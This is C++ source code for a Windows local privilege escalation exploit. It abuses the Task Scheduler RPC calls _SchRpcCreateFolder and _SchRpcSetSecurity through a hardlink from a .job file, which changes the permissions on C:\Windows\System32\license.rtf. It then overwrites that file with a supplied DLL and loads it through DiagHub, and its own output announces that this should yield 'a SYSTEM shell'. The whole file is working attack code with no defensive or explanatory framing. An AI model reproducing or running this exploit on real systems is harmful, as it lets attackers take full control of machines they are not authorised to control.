#include "stdafx.h"
#include "rpc_h.h"
#include <fstream>
#include <comdef.h>
#include <sddl.h>
#include <strsafe.h>
#include "ScopedHandle.h"

#include "DiagHub.h"

#pragma comment(lib, "rpcrt4.lib")

using namespace std;

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"c8ba73d2-3d55-429c-8e9a-c44f006f69fc", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);

	//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
	_SchRpcCreateFolder(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	_SchRpcSetSecurity(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
}


int wmain(int argc, wchar_t** argv)
{
	if (argc != 3)
	{
		printf("%ls [dll] [temp]\n", argv[0]);
		return 0;
	}

	else {
		wchar_t FileToOverwrite[MAX_PATH] = L"C:\\Windows\\System32\\license.rtf";

		printf("[*] Copying current %ls over to %ls\n", FileToOverwrite, argv[2]);

		if (!CopyFileW(FileToOverwrite, argv[2], FALSE))
		{
			printf("[!] Failed to copy over to temporary file, are you certain you have write permissions?\n");
			return 0;
		}

		printf("[*] Setting C:\\Windows\\System32\\license.rtf to RWX\n");


		CreateNativeHardlink(L"C:\\Windows\\Tasks\\UpdateTask.job", FileToOverwrite);

		RunExploit();

		printf("[*] Copying %ls over C:\\Windows\\System32\\license.rtf\n", argv[1]);

		if (!CopyFileW(argv[1], FileToOverwrite, FALSE))
		{
			printf("[!] Failed to copy %ls over C:\\Windows\\System32\\license.rtf", argv[1]);
			return 0;
		}

		printf("[+] Loading DLL\n");
		LoadDll();

		printf("[+] If everything has gone well, you should have a SYSTEM shell!\n");

		printf("[*] Restoring original license.rtf\n");
		
		if (!CopyFileW(argv[2], FileToOverwrite, FALSE))
		{
			printf("[!] Failed in copying the original file over! Make sure to cleanup");
			return 0;
		}
	}

	return 0;
}

